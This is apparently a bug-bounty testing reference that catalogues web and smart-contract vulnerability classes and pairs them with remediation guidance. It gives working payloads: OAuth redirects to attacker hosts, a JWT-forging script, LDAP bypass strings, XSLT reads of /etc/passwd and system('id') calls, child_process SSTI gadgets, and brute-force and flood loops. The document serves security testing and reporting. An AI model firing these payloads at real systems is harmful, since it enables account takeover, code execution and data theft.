# Advanced Vulnerability Vectors — Web2 + Web3

> Added v2.6.0. Covers gaps: OAuth redirect URI bypass, cookie tossing, JWT alg confusion, privilege escalation via missing role checks, UUID vs sequential IDOR, integer overflow (web2), sandwichable logic, slippage manipulation, minOut validation, signature replay across chains, unchecked return values, LDAP injection, XSLT injection, prototype pollution, SSTI via error pages, WebSocket frame manipulation.

---

## 1. AUTHENTICATION — Advanced Vectors

### 1.1 OAuth Redirect URI Bypass

**What it is:** Attacker manipulates the OAuth redirect_uri parameter to redirect authorization codes/tokens to their own server.

**Test vectors:**
```
# Test 1: Open redirect via subdomain
https://provider.com/auth?redirect_uri=https://attacker.evil.target.com/callback

# Test 2: Path traversal in redirect
https://provider.com/auth?redirect_uri=https://target.com/callback/../../../attacker.com

# Test 3: Protocol downgrade
https://provider.com/auth?redirect_uri=http://target.com/callback

# Test 4: Fragment injection
https://provider.com/auth?redirect_uri=https://target.com/callback%23%40attacker.com

# Test 5: Wildcard registration abuse
https://provider.com/auth?redirect_uri=https://target.com.callback.attacker.com

# Test 6: Plus sign / encoded tricks
https://provider.com/auth?redirect_uri=https://target.com/callback+@attacker.com

# Test 7: Case sensitivity bypass
https://provider.com/auth?redirect_uri=https://Target.com/Callback
```

**Detection:**
```bash
# Enumerate registered redirect URIs by triggering OAuth flow with various URIs
curl -s -D- "https://provider.com/authorize?client_id=CLIENT&response_type=code&redirect_uri=https://evil.com" | grep -i "redirect_uri_mismatch"
# Different error = different validation logic
```

**Severity:** HIGH (P2) — Full account takeover via authorization code interception.

**What's NOT a finding:** If provider returns `redirect_uri_mismatch` for all non-whitelisted URIs, it's working as intended.

---

### 1.2 Cookie Tossing (Domain Scope Exploitation)

**What it is:** Setting cookies on parent domain to affect subdomains. A cookie set on `.example.com` is sent to ALL subdomains. If an attacker can set cookies on the parent, they can impersonate users on child apps.

**Test vectors:**
```bash
# Step 1: Check if you can register on a subdomain
curl -X POST "https://sub.example.com/register" -d "username=attacker&password=pass123"

# Step 2: Login and capture session cookie
curl -v -X POST "https://sub.example.com/login" -d "username=attacker&password=pass123"
# Note: Set-Cookie header — does it have Domain= attribute?

# Step 3: If cookie has Domain=.example.com, the session works on ALL subdomains
# including the main app, admin panel, API, etc.

# Step 4: Test by sending the cookie to another subdomain
curl -H "Cookie: session=VICTIM_SESSION_VALUE" "https://app.example.com/api/me"
```

**Why it works:**
- App sets `Set-Cookie: session=abc; Domain=.example.com` → cookie goes to ALL subdomains
- If attacker's subdomain can register/login → attacker gets cookie scoped to parent domain
- Attacker can then use that cookie (or set a victim's cookie via XSS on their subdomain) to impersonate on the main app

**Detection:**
```
1. Register on ANY subdomain of target
2. Login and check Set-Cookie Domain attribute
3. If Domain = parent domain → cookie tossing possible
4. Check if main app reads the same cookie name
```

**Severity:** HIGH (P2) — Full account takeover if attacker can set cookies on any subdomain.

**Also check:** `__Host-` and `__Secure-` cookie prefixes — these prevent domain tossing. If absent, risk is higher.

---

### 1.3 JWT Algorithm Confusion

**What it is:** Switching JWT algorithm from RS256 (asymmetric) to HS256 (symmetric), using the PUBLIC KEY as the HMAC secret. Many libraries auto-detect algorithm from the `alg` header.

**Attack flow:**
```
1. Download the server's public key (from JWKS endpoint, /jwks.json, or certificate)
2. Modify JWT header: {"alg": "HS256", "typ": "JWT"}
3. Re-sign with HMAC using the public key as secret
4. Server treats it as valid HMAC signature
```

**Test vectors:**
```bash
# Step 1: Get public key
curl -s "https://target.com/.well-known/jwks.json" | python3 -c "
import sys, json
jwks = json.load(sys.stdin)
for k in jwks['keys']:
    print(f'kid: {k[\"kid\"]}, kty: {k[\"kty\"]}, alg: {k[\"alg\"]}')
"

# Step 2: Decode token, change alg to HS256, sign with public key as secret
# Using jwt_tool (if installed) or Python:
python3 -c "
import jwt, json, base64
# Read public key
with open('public_key.pem') as f:
    pubkey = f.read()
# Original token
token = 'eyJhbGciOiJSUzI1NiJ9...'
# Decode header
header = json.loads(base64.urlsafe_b64decode(token.split('.')[0] + '=='))
header['alg'] = 'HS256'
# Re-sign with public key as HMAC secret
forged = jwt.encode(json.loads(base64.urlsafe_b64decode(token.split('.')[1] + '==')),
                     key=pubkey, algorithm='HS256', headers=header)
print(forged)
"

# Step 3: Test with forged token
curl -H "Authorization: Bearer FORGED_TOKEN" "https://target.com/api/admin"
```

**Severity:** CRITICAL (P1) — Authentication bypass, full account takeover, admin impersonation.

**Hardening:**
- ALWAYS validate algorithm on server: `if (token.alg !== 'RS256') throw`
- Never use `algorithms=None` in library calls
- Use asymmetric verification (`verify=True`), never mixed mode

---

## 2. AUTHORIZATION — Advanced Vectors

### 2.1 Privilege Escalation via Missing Role Checks

**What it is:** API endpoints that check authentication (valid session) but NOT authorization (role/permission). Any logged-in user can access admin/manager endpoints.

**Test vectors:**
```bash
# Step 1: Enumerate endpoints from JS bundle / OpenAPI / GraphQL
grep -oE '/api/[a-zA-Z0-9/_-]+' js_bundle.js | sort -u

# Step 2: For each endpoint, test with LOW-PRIVILEGE user
curl -H "Authorization: Bearer LOW_PRIV_TOKEN" "https://target.com/api/admin/users"
curl -H "Authorization: Bearer LOW_PRIV_TOKEN" "https://target.com/api/admin/settings"
curl -H "Authorization: Bearer LOW_PRIV_TOKEN" "https://target.com/api/internal/config"

# Step 3: Try role parameter injection
curl -H "Authorization: Bearer LOW_PRIV_TOKEN" \
     -H "X-Role: admin" \
     -d '{"role":"admin"}' \
     "https://target.com/api/user/profile"

# Step 4: GraphQL — check if viewer query exposes admin fields
curl -X POST "https://target.com/graphql" \
  -H "Authorization: Bearer LOW_PRIV_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ viewer { id email role isAdmin permissions } }"}'
```

**Severity:** HIGH (P2) — Depends on what the admin endpoint does (data exposure vs state change).

---

### 2.2 IDOR — UUID vs Sequential Classification

**Classification matters for severity:**
| ID Type | Difficulty | Severity Multiplier |
|---------|-----------|---------------------|
| Sequential integer (1, 2, 3) | Trivial | High — guessable |
| UUID v4 (random) | Infeasible | Low — can't enumerate |
| UUID v1 (time-based) | Medium | Medium — timestamp leaks |
| Short hash (6-8 chars) | Medium | Medium-HIGH — if brute-forceable |
| MongoDB ObjectId (12 hex) | Easy | Medium — contains timestamp + counter |
| Composite (user_id + order_id) | Medium | Depends on which ID is guessable |

**Test vectors for sequential IDs:**
```bash
# Iterate and dump
for i in $(seq 1 100); do
  resp=$(curl -s -H "Authorization: Bearer TOKEN" "https://target.com/api/orders/$i")
  len=$(echo "$resp" | wc -c)
  echo "ID=$i len=$len"
done
```

**Test vectors for UUID/short IDs:**
```bash
# For short IDs (e.g., invite codes, sharing links):
# Generate wordlist of possible combinations
crunch 6 6 -t @@@@@@ -o possible_codes.txt
# Brute force
while read code; do
  resp=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/share/$code")
  [ "$resp" = "200" ] && echo "VALID: $code"
done < possible_codes.txt
```

---

## 3. BUSINESS LOGIC — Web2 + Web3

### 3.1 Integer/Big Number Overflow (Web2 Context)

**Not just web3 — web2 apps overflow too:**
```bash
# Price calculation overflow
curl -X POST "https://target.com/cart/checkout" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"id": 1, "quantity": 9999999999999999}]}'

# Quantity as negative (refund attack)
curl -X POST "https://target.com/cart/checkout" \
  -d '{"items": [{"id": 1, "quantity": -5}]}'

# Discount code stacking
curl -X POST "https://target.com/cart/checkout" \
  -d '{"discount_codes": ["CODE1", "CODE1", "CODE1", "CODE1"]}'

# Overflow in balance/credits
curl -X POST "https://target.com/api/transfer" \
  -d '{"amount": 2147483647, "to": "attacker"}'  # INT32_MAX

# Float precision attack (price = $0.001, quantity = very large)
curl -X POST "https://target.com/cart/checkout" \
  -d '{"items": [{"id": 1, "quantity": 1000000, "price": 0.001}]}'
```

**Severity:** HIGH (P2) — Financial loss, balance manipulation.

---

### 3.2 Sandwichable Logic (Web3)

**What it is:** A transaction that can be front-run and back-run by MEV bots on the mempool. If the user's trade significantly moves the price, an attacker can:
1. Buy before the victim (front-run)
2. Let the victim's trade execute at worse price
3. Sell immediately after (back-run)

**Detection (no MEV bot needed):**
```solidity
// Check if contract has slippage protection
function swap(uint amountIn, uint minAmountOut) external {
    // If minAmountOut is not enforced or can be set to 0 → sandwichable
}
```

**Test:**
```solidity
// Foundry test
function testSandwichVulnerability() public {
    // Setup: attacker has same token as victim
    // Step 1: Check if large trade moves price > 1%
    uint priceBefore = pair.getReserves();
    router.swap(tokenIn, amountIn, path, address(this), block.timestamp);
    uint priceAfter = pair.getReserves();
    // If price impact > 1% and no slippage guard → sandwichable
}
```

**Severity:** MEDIUM-HIGH — MEV extraction, victim gets worse price.

---

### 3.3 Slippage Manipulation

**What it is:** Exploiting contracts that don't properly calculate or enforce minimum output amounts.

**Test vectors:**
```solidity
// Test 1: Zero slippage protection
function testZeroMinOut() public {
    router.swapExactTokensForTokens(
        amountIn,
        0,  // minAmountOut = 0 → victim accepts ANY output
        path,
        address(this),
        block.timestamp
    );
}

// Test 2: Stale price oracle
function testStalePrice() public {
    // Manipulate price on one DEX
    // Call swap on target contract using stale oracle
    // Profit = actual price - stale price
}

// Test 3: Deadline bypass
function testDeadlineBypass() public {
    // If deadline = 0 or very far future → tx can be held and executed later
    router.swapExactTokensForTokens(
        amountIn, minOut, path, dest, 0  // deadline = 0
    );
}
```

---

### 3.4 Signature Replay Across Chains (CRITICAL — Web3)

**What it is:** A signed message (EIP-712, personal_sign) that's valid on chain A is also valid on chain B if the contract is deployed at the same address (CREATE2) or if the same signer is used.

**Attack flow:**
```
1. User signs message on Ethereum: "Transfer 10 ETH to Alice"
2. Attacker submits same signature on Polygon (same contract address)
3. Contract verifies signature → valid (same message, same signer)
4. Funds transferred on both chains
```

**Test vectors:**
```solidity
// Check if contract includes chain ID in signed message
function testChainIdInSignature() public {
    // If signed message is: {action: "transfer", amount: 10, recipient: "Alice"}
    // Without chainId → replayable across chains

    // If signed message is: {action: "transfer", amount: 10, recipient: "Alice", chainId: 1}
    // With chainId → NOT replayable (good)
}

// Check if contract includes nonce
function testNonceInSignature() public {
    // If no nonce → replayable on same chain (double-spend)
}
```

**Required in signed messages:**
```solidity
struct Message {
    address from;
    uint256 amount;
    address to;
    uint256 nonce;      // ← Must include
    uint256 chainId;    // ← Must include
    address verifyingContract;  // ← Must include
}
```

**Severity:** CRITICAL (P1) — Direct fund theft across chains.

---

### 3.5 Unchecked Return Values (Web3)

**What it is:** Token transfers can return `false` instead of reverting. If the contract doesn't check the return value, the transfer is "successful" in the contract's eyes but funds never moved.

**Test vectors:**
```solidity
// Check for unchecked transfer returns
// Search codebase for:
bool success = token.transfer(to, amount);
// vs
token.transfer(to, amount);  // ← Return value ignored

// Safe version:
require(token.transfer(to, amount), "Transfer failed");
// or use SafeERC20:
safeToken.safeTransfer(to, amount);
```

**Attack:** Deploy a non-standard ERC20 that returns `false` on transfer. Use it to "pay" without actually paying.

---

## 4. INPUT HANDLING — Advanced Vectors

### 4.1 LDAP Injection

**What it is:** Injecting LDAP filter metacharacters into login/search queries to bypass authentication or extract data.

**Test vectors:**
```bash
# Authentication bypass
Username: *)(uid=*))(|(uid=*
Password: anything

# Filter manipulation
Username: admin)(&)
Username: *)(objectClass=*))
Username: *)(&(objectClass=*)(password=*

# Blind extraction
Username: *)(|(description=a*)(description=b*)(description=c*)

# Null byte injection
Username: admin%00
```

**Detection:**
```
1. Login with special chars: (, ), *, |, &, !, \
2. If error reveals LDAP structure → vulnerable
3. If login succeeds with filter bypass → CRITICAL
4. If search results change based on input → blind injection possible
```

**Severity:** HIGH (P2) — Authentication bypass or data extraction.

**Hardening:** Escape all LDAP special characters: `\28` for `(`, `\29` for `)`, `\2a` for `*`, `\5c` for `\`.

---

### 4.2 XSLT Injection

**What it is:** Injecting XSLT code into XML transformation contexts. If the server processes user-supplied XSLT, attacker can achieve RCE.

**Test vectors:**
```xml
<!-- Basic detection -->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="system-property('xsl:version')"/>
  </xsl:template>
</xsl:stylesheet>

<!-- XXE via XSLT -->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>

<!-- PHP execution (if XSLT processor is libxslt with PHP) -->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:value-of select="php:function('system', 'id')"/>
  </xsl:template>
</xsl:stylesheet>

<!-- Java XSLT (Saxon/Bayesian) RCE -->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:exslt="http://exslt.org/common"
                extension-element-prefixes="exslt">
  <xsl:template match="/">
    <exslt:document href="file:///tmp/pwned.txt" method="text">
      <xsl:text>RCE via XSLT</xsl:text>
    </exslt:document>
  </xsl:template>
</xsl:stylesheet>
```

**Detection:**
```
1. Find XML upload/processing endpoints (SOAP, SAML, SVG, DOCX)
2. Inject XSLT declarations in XML payload
3. If transformation output changes → XSLT is being processed
4. Escalate to XXE/RCE based on XSLT processor
```

**Severity:** HIGH-CRITICAL (P1-P2) — RCE if XSLT processor allows it.

---

### 4.3 Prototype Pollution (Client + Server)

**What it is:** Overwriting `Object.prototype` in JavaScript to inject properties into ALL objects. Works both client-side (browser) and server-side (Node.js).

**Client-side attack vectors:**
```javascript
// URL parameter injection
https://target.com/?__proto__[isAdmin]=true
// Now: {}.isAdmin === true
// If app checks: if (user.isAdmin) → privilege escalation

// JSON merge with prototype pollution
fetch('/api/settings', {
  method: 'POST',
  body: JSON.stringify({
    "__proto__": {
      "admin": true,
      "role": "superadmin"
    }
  })
});

// Property injection for XSS
https://target.com/?__proto__[innerHTML]=<img src=x onerror=alert(1)>
```

**Server-side attack vectors (Node.js):**
```javascript
// Express parameter pollution → RCE
// If app uses lodash.merge, deepMerge, or similar:
POST /api/update
{
  "__proto__": {
    "exec": "require('child_process').exec('id')"
  }
}
// If this object is later used as child process options → RCE

// CVE-2018-3721: lodash < 4.17.11
POST /api/merge
{
  "__proto__": { "jsonReviver": "malicious_function" }
}
```

**Detection:**
```bash
# Test for prototype pollution via URL
curl "https://target.com/?__proto__[testpolluted]=polluted"
# Then check if any object has .testpolluted property

# Test via JSON body
curl -X POST "https://target.com/api/update" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"testpolluted":"polluted"}}'
```

**Severity:** MEDIUM-HIGH — Escalates to HIGH/CRITICAL if combined with gadget (RCE, auth bypass).

---

### 4.4 SSTI via Error Pages

**What it is:** When a web framework renders error pages with user input (stack traces, debug mode), template injection can occur through error handlers.

**Test vectors:**
```bash
# Step 1: Trigger error with template syntax
curl "https://target.com/{{7*7}}"
curl "https://target.com/${7*7}"
curl "https://target.com/<%= 7*7 %>"

# Step 2: Trigger 404 with template in path
curl "https://target.com/{{7*7}}/nonexistent"

# Step 3: Trigger error via Accept header
curl -H "Accept: application/vnd.custom+json" "https://target.com/api/data"

# Step 4: Trigger error via Content-Type
curl -X POST "https://target.com/api/data" \
  -H "Content-Type: application/xml" \
  -d '<root>{{7*7}}</root>'

# Step 5: Trigger error via cookie
curl -H "Cookie: session={{7*7}}" "https://target.com/dashboard"

# Step 6: Check error page response for evaluation
# If response contains "49" → template is evaluated → SSTI
# If response contains "{{7*7}}" → not evaluated (escaped/safe)
```

**Frameworks to check:**
- Jinja2 (Python): `{{config}}`, `{{self.__init__.__globals__}}`
- Twig (PHP): `{{_self.env}}`, `{{['id']|filter('system')}}`
- Nunjucks (Node): `{{range.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}`
- Handlebars (Node): `{{#with "s" as |string|}}{{#with "e"}}...`

**Severity:** CRITICAL (P1) — Remote Code Execution.

---

## 5. WEBSOCKET — Frame-Level Testing

### 5.1 WebSocket Frame Manipulation

**What it is:** Beyond WebSocket hijacking (which we already cover), frame-level attacks target the protocol itself.

**Test vectors:**
```javascript
// Connect to WebSocket
const ws = new WebSocket('wss://target.com/ws');

// Test 1: Subscribe to other users' data
ws.send(JSON.stringify({
  "action": "subscribe",
  "channel": "user:ALL"  // Try universal/wildcard channels
}));

// Test 2: Message injection (no sanitization)
ws.send('{"action":"transfer","to":"attacker","amount":999999}{"action":"transfer","to":"attacker","amount":1}');  // Frame splitting

// Test 3: Overflow attack
ws.send('A'.repeat(1048576));  // 1MB message

// Test 4: Binary frame injection
ws.send(new Uint8Array([0x00, 0xFF, 0xFF, 0xFF]));

// Test 5: Unauthorized channel subscription
ws.send(JSON.stringify({"action":"subscribe","channel":"admin:logs"}));
ws.send(JSON.stringify({"action":"subscribe","channel":"internal:config"}));

// Test 6: Ping/pong abuse (DoS)
for(let i=0; i<10000; i++) ws._socket.write(Buffer.from([0x89, 0x00]));  // Ping flood

// Test 7: Close frame manipulation
ws._socket.write(Buffer.from([0x88, 0x02, 0x03, 0xE8]));  // Abnormal close code 1000
```

**Detection via wscat:**
```bash
# Install: npm install -g wscat
wscat -c "wss://target.com/ws"
> {"action":"subscribe","channel":"user:*"}
> {"action":"subscribe","channel":"admin:*"}
> {"action":"subscribe","channel":"system:*"}
# Observe if any channel returns data
```

**Severity:** MEDIUM-HIGH — Depends on what data is exposed via unauthorized channels.

---

## 6. PHASE STRUCTURE ENHANCEMENTS

### 6.1 Trust Boundary Diagram (Per Target)

For each target, document:
```
[Browser/App] --trust boundary--> [API Gateway/CDN]
    |
    v
[API Server] --trust boundary--> [Database]
    |
    v
[Third-party Service] --trust boundary--> [External API]
    |
    v
[Web3: User Wallet] --trust boundary--> [Smart Contract]
    |
    v
[Smart Contract] --trust boundary--> [Other Contracts / Oracle]
```

**Mark each boundary with:** What's trusted, what's validated, what's assumed.

### 6.2 State-Changing Operations Table

| Endpoint | Method | Auth Required | Role Check | Rate Limit | Audit Log |
|----------|--------|---------------|------------|------------|-----------|
| /api/transfer | POST | ✅ | ❌ | 10/min | ✅ |
| /api/admin/settings | PUT | ✅ | ✅ (admin) | None | ✅ |
| /api/user/delete | DELETE | ✅ | ❌ | None | ❌ |

**Missing role check = privilege escalation. Missing rate limit = abuse vector. Missing audit log = cover-up risk.**

### 6.3 PoC Format (Expected vs Actual)

```markdown
### PoC: [Vulnerability Name]

**Setup:**
1. Create two accounts: attacker@example.com, victim@example.com
2. Login as attacker, get session token

**Request:**
```http
GET /api/users/VICTIM_ID HTTP/1.1
Host: target.com
Authorization: Bearer ATTACKER_TOKEN
```

**Expected Behavior:**
- HTTP 403 Forbidden
- Response: {"error": "insufficient permissions"}

**Actual Behavior:**
- HTTP 200 OK
- Response: {"id": 12345, "email": "victim@example.com", "ssn": "123-45-6789", "balance": 50000}

**Impact:** Attacker can read any user's PII and financial data via sequential ID enumeration.
```

### 6.4 CVSS v3.1 — Mandatory Vector String

Every finding MUST include the full vector string:
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N — Score: 8.6 (HIGH)
```

Breakdown:
- AV:N (Network) / AV:L (Local) / AV:A (Adjacent)
- AC:L (Low complexity) / AC:H (High)
- PR:N (None) / PR:L (Low) / PR:H (High)
- UI:N (None) / UI:R (Required)
- S:U (Unchanged) / S:C (Changed)
- C:N/L/H / I:N/L/H / A:N/L/H

### 6.5 Business Impact Categories

Each finding must map to at least one:
- **Data Exfiltration:** Sample of data accessible (e.g., "50 users' PII including emails, phone numbers, addresses")
- **PII Leakage:** Specific PII types exposed (SSN, payment info, medical records)
- **Financial Loss Path:** Step-by-step profit path (e.g., "Buy token on DEX before announcement → price +50% → sell for $X")
- **System Integrity:** Config modification, code injection, persistence
- **Reputation/User Trust:** What users would think if this was public

---

## 7. REMEDIATION — Mandatory Per Finding

### 7.1 Fix Difficulty Rating

| Difficulty | Criteria |
|-----------|----------|
| Easy | Config change, header addition, parameter validation |
| Medium | Code change in one file, library update, middleware addition |
| Hard | Architecture change, database migration, protocol redesign |

### 7.2 Secure Code Snippets (Per Finding Type)

**OAuth redirect URI bypass:**
```python
# WRONG: Wildcard matching
if redirect_uri.startswith(registered_uri):
    allow_redirect()

# RIGHT: Exact match
if redirect_uri == registered_uri:
    allow_redirect()
```

**JWT alg confusion:**
```javascript
// WRONG: Auto-detect algorithm
jwt.verify(token, publicKey);  // Library may use alg from header

// RIGHT: Force algorithm
jwt.verify(token, publicKey, { algorithms: ['RS256'] });
```

**Cookie tossing:**
```javascript
// WRONG: Domain cookie
res.cookie('session', token, { domain: '.example.com' });

// RIGHT: Host-only cookie (no Domain attribute)
res.cookie('session', token, { secure: true, httpOnly: true, sameSite: 'strict' });
// Or use __Host- prefix:
res.setHeader('Set-Cookie', `__Host-session=${token}; Path=/; Secure; HttpOnly; SameSite=Strict`);
```

**Prototype pollution:**
```javascript
// WRONG: Deep merge without filtering
function merge(target, source) {
    for (let key in source) {
        target[key] = source[key];  // __proto__ pollutes prototype
    }
}

// RIGHT: Filter dangerous keys
function merge(target, source) {
    for (let key in source) {
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;
        target[key] = source[key];
    }
}
// Or use: Object.create(null) for target, or Object.freeze(Object.prototype)
```

**LDAP injection:**
```python
# WRONG: String interpolation
filter = f"(&(uid={username})(password={password}))"

# RIGHT: Escape special characters
def ldap_escape(value):
    return value.replace('\\', '\\5c').replace('*', '\\2a').replace('(', '\\28').replace(')', '\\29').replace('\0', '\\00')

filter = f"(&(uid={ldap_escape(username)})(password={ldap_escape(password)}))"
```

**XSS via XSS (SSTI):**
```python
# RIGHT: Use auto-escaping template engine
# Jinja2 default auto-escapes: {{ user_input }}
# Never use: Markup(user_input) or |safe filter on user data
# Never use: render_template_string(user_input)
```

**Signature replay (Web3):**
```solidity
// RIGHT: Include chainId + nonce + verifyingContract
bytes32 structHash = keccak256(
    abi.encode(
        TYPEHASH,
        message.from,
        message.amount,
        message.to,
        nonces[message.from]++,  // Increment nonce
        block.chainid,           // Include chain ID
        address(this)            // Include contract address
    )
);
```

### 7.3 WAF Bypass Hardening

When findings involve bypassing WAF/input filtering:
```nginx
# ModSecurity CRS hardening
SecRule REQUEST_URI|REQUEST_HEADERS|REQUEST_BODY|ARGS \
    "@rx (?:union|select|insert|update|delete|drop|exec|eval|script)" \
    "id:1001,phase:1,block,msg:'SQLi/XSS filter',severity:2"

# Cloudflare WAF rules (dashboard)
# Rule: Block requests with SQL keywords in URI + body
# Rule: Block requests with template syntax in URI
# Rule: Rate limit auth endpoints (5 req/min per IP)
```

---

## 8. FALSE-POSITIVE REDUCTION CHECKLIST

Before finalizing ANY finding, verify ALL:

- [ ] **Exploitable from external perspective?** (Not internal/testing only)
- [ ] **Causes REAL damage?** (Data loss, financial loss, system compromise)
- [ ] **Not by-design?** (Health endpoints, public APIs, sandbox configs)
- [ ] **Reproducible from clean state?** (Not dependent on specific user session)
- [ ] **CVSS backed by evidence?** (Not theoretical)
- [ ] **PoC works consistently?** (Not a one-time race condition)
- [ ] **Severity matches actual impact?** (Not inflated)
- [ ] **Triager would accept this?** (Not informational)
- [ ] **Chains to higher impact?** (If partial chain, document where it breaks)
- [ ] **Different from known public disclosures?** (Not already fixed/known)

**Self-filtering rule:** If you need to explain WHY it's a finding instead of it being obvious from the PoC → it's probably informational. Real bugs speak for themselves.
